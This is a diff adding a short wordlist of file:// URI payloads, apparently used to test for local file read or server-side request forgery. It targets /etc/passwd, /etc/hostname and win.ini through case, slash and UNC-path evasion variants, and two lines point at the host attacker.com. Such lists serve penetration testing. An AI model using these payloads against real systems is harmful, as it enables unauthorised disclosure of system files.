@@ -1,0 +1,15 @@
+file:///etc/passwd
+file:////etc/passwd
+file:///etc/hostname
+fILe:///etc/passwd
+file:///windows/win.ini
+file://\windows\win.ini
+file://\\windows\\win.ini
+file://c:/windows/win.ini
+file://c:\windows\win.ini
+file://c:\\windows\\win.ini
+file://localhost/$c/windows/win.ini
+file://\\localhost\$c\windows\win.ini
+file://\\\\localhost\\$c\\windows\\win.ini
+file://attacker.com/test
+file://attacker.com@80/test
